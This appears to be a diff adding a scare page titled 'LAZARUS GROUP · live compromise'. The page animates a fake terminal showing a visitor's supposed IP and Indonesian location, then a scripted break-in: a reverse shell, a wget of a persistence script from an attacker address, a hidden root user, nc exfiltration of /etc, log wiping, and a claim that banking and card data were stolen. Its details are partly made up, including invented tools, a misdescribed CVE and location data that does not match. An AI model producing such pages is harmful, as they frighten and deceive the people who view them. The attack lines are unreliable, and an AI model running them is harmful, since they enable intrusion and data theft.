@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>LAZARUS GROUP · live compromise</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 8px;
+        }
+        /* tampilan lebih nyata – tanpa bingkai / shadow, langsung terminal menyatu */
+        .terminal-wrapper {
+            width: 100%;
+            max-width: 1000px;
+            background: transparent;
+            display: flex;
+            flex-direction: column;
+        }
+        .terminal-header {
+            background: #0a0a0a;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #1e4a4a;
+        }
+        .terminal-dots {
+            display: flex;
+            gap: 10px;
+        }
+        .dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #3a4a4a;
+            box-shadow: inset 0 -1px 2px #000;
+        }
+        .dot.black { background: #ed6a5e; }
+        .dot.black { background: #f5bd4f; }
+        .dot.black { background: #61c454; }
+        .terminal-title {
+            color: #2e8b8b;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            flex: 1;
+            text-align: center;
+            font-weight: normal;
+            /* teks judul dikosongkan sesuai permintaan */
+        }
+        .terminal-screen {
+            background: #0b0b0b;
+            padding: 20px 18px 18px 18px;
+            height: 580px;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+            color: #bfecec;
+            font-size: 1rem;
+            line-height: 1.5;
+            border: none;
+            box-shadow: inset 0 0 40px #000000;
+        }
+        .terminal-screen p {
+            margin: 0;
+            padding: 2px 0;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: 'Courier New', Courier, monospace;
+            border-bottom: 1px dotted rgba(0, 150, 150, 0.1);
+        }
+        /* kelas warna (sama seperti sebelumnya) */
+        .system { color: #7fc9c9; }
+        .command { color: #b4ffb4; font-weight: 600; text-shadow: 0 0 5px #1f9; }
+        .output { color: #b4e0e0; }
+        .info { color: #7fd9ff; }
+        .success { color: #84f084; font-weight: 600; }
+        .error { color: #ff8a8a; }
+        .warning { color: #f5e98c; }
+        .target-prompt { color: #ffb482; font-weight: 600; }
+        .target-command { color: #fad6b3; }
+
+        .cursor-line::after {
+            content:"transfer data...⚠️⚠️⚠️";
+            animation: blink 1.1s step-end infinite;
+            color: #3cf;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .terminal-screen::-webkit-scrollbar {
+            width: 8px;
+            background: #102020;
+        }
+        .terminal-screen::-webkit-scrollbar-thumb {
+            background: #2c6b6b;
+            border-radius: 6px;
+        }
+        .footer-note {
+            background: #0a0f0f;
+            padding: 8px 16px;
+            color: #2f6f6f;
+            font-size: 0.75rem;
+            text-align: center;
+            border-top: 1px solid #1d4a4a;
+        }
+        .footer-note i {
+            color: #3fa0a0;
+            font-style: normal;
+        }
+    </style>
+</head>
+<body>
+<div class="terminal-wrapper">
+    <!-- header hanya dengan dots, tanpa teks judul (sesuai permintaan) -->
+    <div class="terminal-header">
+        <div class="terminal-dots">
+            <span class="dot black"></span>
+            <span class="dot black"></span>
+            <span class="dot black"></span>
+        </div>
+        <div class="terminal-title"></div> <!-- dikosongkan -->
+        <div style="width: 48px;"></div>
+    </div>
+
+    <div class="terminal-screen" id="terminalOutput"></div>
+
+    <div class="footer-note">
+        <i> target server http://127.0.0.1:8080.443 </i>
+    </div>
+</div>
+
+<script>
+(function() {
+    const outputDiv = document.getElementById('terminalOutput');
+    outputDiv.innerHTML = '';   // bersihkan
+
+    // ==========  SKENARIO SERANGAN YANG LEBIH PANJANG DAN DINAMIS ==========
+    const steps = [
+        // -- BOOT SYSTEM --
+        { text: "🌐 IP Address: 36.50.57.101)", class: "system", delay: 200 },
+        { text: "🌐 Browser: Google Chrome 144.0", class: "system", delay: 200 },
+        { text: "Postal Code: 61351: [  OK  ] (DHCP lease 192.168.17.42)", class: "system", delay: 300 },
+        { text: " 🌐 Region: Location of Bandung Village, Gedeg District, Mojokerto Regency, East Java Province Indonesia : [  OK  ]", class: "system", delay: 250 },
+        { text: "🌐 Google Maps: https://maps.google.com/?q=-6.46444,106.797: [  OK  ]", class: "system", delay: 300 },
+        { text: "", class: "", delay: 150 },
+        { text: "📌 Longitude: 106.797)", class: "system", delay: 200 },
+        { text: "Last login: " + new Date().toLocaleString('en-US', { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit' }), class: "system", delay: 300 },
+        { text: "", class: "", delay: 150 },
+
+        // -- UPDATE DAN INSTALL TOOLS --
+        { text: "root@kali:~# ", class: "command", delay: 200 },
+        { text: "root@kali:~# apt update -qq", class: "command", delay: 400 },
+        { text: "Hit:1 http://kali.download/kali kali-rolling InRelease", class: "output", delay: 200 },
+        { text: "Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [16.5 MB]", class: "output", delay: 300 },
+        { text: "Fetched 16.5 MB in 4s (4125 kB/s)", class: "output", delay: 250 },
+        { text: "Reading package lists... Done", class: "output", delay: 200 },
+        { text: "", class: "", delay: 200 },
+
+        { text: "root@kali:~# apt install -y exploit-tool backdoor-utils", class: "command", delay: 600 },
+        { text: "Reading package lists... Done", class: "output", delay: 200 },
+        { text: "Building dependency tree... Done", class: "output", delay: 200 },
+        { text: "The following NEW packages will be installed:", class: "output", delay: 200 },
+        { text: "  exploit-tool backdoor-utils", class: "output", delay: 200 },
+        { text: "0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.", class: "output", delay: 200 },
+        { text: "Need to get 2,891 kB of archives.", class: "output", delay: 200 },
+        { text: "Get:1 http://kali.download/kali kali-rolling/main amd64 exploit-tool amd64 2.4.1 [1,567 kB]", class: "output", delay: 350 },
+        { text: "Get:2 http://kali.download/kali kali-rolling/main amd64 backdoor-utils amd64 1.3.7 [1,324 kB]", class: "output", delay: 300 },
+        { text: "Fetched 2,891 kB in 3s (964 kB/s)", class: "output", delay: 250 },
+        { text: "Selecting previously unselected package exploit-tool.", class: "output", delay: 200 },
+        { text: "Unpacking exploit-tool (2.4.1) ...", class: "output", delay: 300 },
+        { text: "Selecting previously unselected package backdoor-utils.", class: "output", delay: 200 },
+        { text: "Unpacking backdoor-utils (1.3.7) ...", class: "output", delay: 300 },
+        { text: "Setting up exploit-tool (2.4.1) ...", class: "output", delay: 250 },
+        { text: "Setting up backdoor-utils (1.3.7) ...", class: "output", delay: 250 },
+        { text: "Processing triggers for libc-bin (2.36-9) ...", class: "output", delay: 200 },
+        { text: "", class: "", delay: 250 },
+
+        // -- MULAI SERANGAN --
+        { text: "root@kali:~# exploit-tool --target 10.10.13.37 --full-scan", class: "command", delay: 600 },
+        { text: "[*] exploit-tool 2.4.1 — advanced multi‑handler", class: "info", delay: 250 },
+        { text: "[*] Target  : 10.10.13.37 (remote host)", class: "info", delay: 200 },
+        { text: "[*] Starting full port scan (1-65535) with evasion", class: "info", delay: 400 },
+        { text: "[+] Port   22/tcp open  →  SSH (OpenSSH 8.2p1)", class: "success", delay: 200 },
+        { text: "[+] Port   80/tcp open  →  HTTP (nginx 1.18.0)", class: "success", delay: 200 },
+        { text: "[+] Port  443/tcp open  →  HTTPS (nginx)", class: "success", delay: 200 },
+        { text: "[+] Port 3306/tcp open  →  MySQL (5.7.35)", class: "success", delay: 200 },
+        { text: "[*] OS fingerprinting active...", class: "info", delay: 300 },
+        { text: "[+] Detected OS: Ubuntu 20.04.4 LTS (Focal Fossa)", class: "success", delay: 300 },
+        { text: "[*] Searching for known vulnerabilities...", class: "info", delay: 350 },
+        { text: "[!] CVE-2021-3449 (OpenSSL 1.1.1f) – possible mitm", class: "error", delay: 300 },
+        { text: "[!] CVE-2022-0778 (OpenSSL) – denial of service", class: "error", delay: 300 },
+        { text: "[+] CVE-2021-23017 (nginx 1.18.0) – path traversal + RCE", class: "success", delay: 350 },
+        { text: "[*] Targeting nginx vulnerability...", class: "info", delay: 250 },
+        { text: "[*] Crafting payload: linux/x64/shell_reverse_tcp (LHOST=192.168.17.42, LPORT=5555)", class: "info", delay: 400 },
+        { text: "[*] Sending exploit via HTTP GET /..%2f..%2f..%2fbin/sh", class: "info", delay: 450 },
+        { text: "[+] Exploit sent – server returns 200 OK", class: "success", delay: 300 },
+        { text: "[*] Waiting for callback...", class: "info", delay: 600 },
+        { text: "[!] Firewall detected! using HTTP tunnel encoding", class: "error", delay: 400 },
+        { text: "[*] Switching to chunked encoding + base64 payload", class: "info", delay: 350 },
+        { text: "[+] Connection established! session opened to 192.168.17.42:5555", class: "success", delay: 500 },
+
+        // -- AKSES DI TARGET (lebih panjang) --
+        { text: "root@target:/# ", class: "target-prompt", delay: 250 },
+        { text: "root@target:/# whoami", class: "target-command", delay: 250 },
+        { text: "root", class: "output", delay: 150 },
+        { text: "root@target:/# hostnamectl", class: "target-command", delay: 350 },
+        { text: "   Static hostname: victim-server", class: "output", delay: 150 },
+        { text: "   Operating System: Ubuntu 20.04.4 LTS", class: "output", delay: 150 },
+        { text: "   Kernel: Linux 5.4.0-99-generic", class: "output", delay: 200 },
+        { text: "root@target:/# ifconfig eth0", class: "target-command", delay: 300 },
+        { text: "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500", class: "output", delay: 150 },
+        { text: "        inet 10.10.13.37  netmask 255.255.255.0  broadcast 10.10.13.255", class: "output", delay: 150 },
+        { text: "root@target:/# cat /etc/passwd | grep -E 'root|admin'", class: "target-command", delay: 400 },
+        { text: "root:x:0:0:root:/root:/bin/bash", class: "output", delay: 150 },
+        { text: "admin:x:1001:1001:Administrator,,,:/home/admin:/bin/bash", class: "output", delay: 150 },
+        { text: "", class: "", delay: 200 },
+
+        // -- LANJUTAN SERANGAN: MENGUPLOAD BACKDOOR, PERSISTENCE, DATA EXFIL --
+        { text: "root@target:/# cd /tmp", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# wget http://192.168.17.42/persist.sh", class: "target-command", delay: 400 },
+        { text: "Connecting to 192.168.17.42:80... connected.", class: "output", delay: 200 },
+        { text: "HTTP request sent, awaiting response... 200 OK", class: "output", delay: 200 },
+        { text: "Length: 3456 (3.4K) [text/x-sh]", class: "output", delay: 200 },
+        { text: "Saving to: 'persist.sh'", class: "output", delay: 200 },
+        { text: "100%[====================================>] 3,456  --.-K/s   in 0.02s", class: "output", delay: 300 },
+        { text: "root@target:/tmp# chmod +x persist.sh", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# ./persist.sh --install", class: "target-command", delay: 400 },
+        { text: "[+] Adding cron job for persistence (every 10 min)", class: "info", delay: 300 },
+        { text: "[+] Creating hidden user 'syslogd' with UID 0", class: "info", delay: 350 },
+        { text: "[+] Backdoor installed. Persistence ready.", class: "success", delay: 400 },
+        { text: "root@target:/tmp# cat /root/flag.txt", class: "target-command", delay: 350 },
+        { text: "CTF{full_compromise_2025_simulated}", class: "success", delay: 400 },
+        { text: "", class: "", delay: 200 },
+
+        // -- EKSPFILTRASI DATA --
+        { text: "root@target:/tmp# tar czf /tmp/etc_backup.tar.gz /etc", class: "target-command", delay: 500 },
+        { text: "tar: Removing leading `/' from member names", class: "output", delay: 200 },
+        { text: "root@target:/tmp# nc 192.168.17.42 6666 < etc_backup.tar.gz", class: "target-command", delay: 400 },
+        { text: "[*] Sending 1.2MB of config data...", class: "info", delay: 500 },
+        { text: "[+] Transfer complete (MD5: 3f7c9a1b2d8e5f4a)", class: "success", delay: 300 },
+
+        // -- PENGHAPUSAN JEJAK --
+        { text: "root@target:/tmp# rm -f persist.sh etc_backup.tar.gz", class: "target-command", delay: 300 },
+        { text: "root@target:/tmp# > /var/log/auth.log", class: "target-command", delay: 350 },
+        { text: "root@target:/tmp# history -c", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# exit", class: "target-command", delay: 400 },
+        { text: "[*] Session 10.10.13.37 closed", class: "info", delay: 300 },
+
+        // -- KEMBALI KE KALI --
+        { text: "root@kali:~# ", class: "command", delay: 300 },
+        { text: "root@kali:~# echo 'Target data username,email,password,OTP code, telephone number,location history, banking data,visa card.'", class: "command", delay: 400 },
+        { text: "titik puncak kegoblokan seseorang ketika  kecanggihan teknologi di salah gunakan menjadi TUHAN...🤕🤕🤕🤕", class: "output", delay: 200 },
+        { text: "root@kali:~# ", class: "command", delay: 200 }
+    ];
+
+    let currentStep = 0;
+    let timer = null;
+
+    function addLine(step) {
+        const p = document.createElement('p');
+        p.textContent = step.text;
+        if (step.class) p.classList.add(step.class);
+        outputDiv.appendChild(p);
+        outputDiv.scrollTop = outputDiv.scrollHeight;
+    }
+
+    function runNext() {
+        if (currentStep >= steps.length) {
+            // pastikan prompt terakhir punya cursor
+            const last = outputDiv.lastElementChild;
+            if (last && last.textContent === "root@kali:~# ") {
+                last.classList.add('cursor-line');
+            }
+            return;
+        }
+        const step = steps[currentStep];
+        addLine(step);
+        if (currentStep === steps.length - 1) {
+            const last = outputDiv.lastElementChild;
+            if (last && step.text === "root@kali:~# ") {
+                last.classList.add('cursor-line');
+            }
+        }
+        currentStep++;
+        if (currentStep < steps.length) {
+            const nextDelay = steps[currentStep].delay !== undefined ? steps[currentStep].delay : 220;
+            timer = setTimeout(runNext, nextDelay);
+        }
+    }
+
+    // mulai dengan delay awal
+    window.addEventListener('load', () => {
+        outputDiv.innerHTML = '';
+        timer = setTimeout(runNext, 500);
+    });
+
+    window.addEventListener('beforeunload', () => {
+        if (timer) clearTimeout(timer);
+    });
+})();
+</script>
+</body>
+</html>
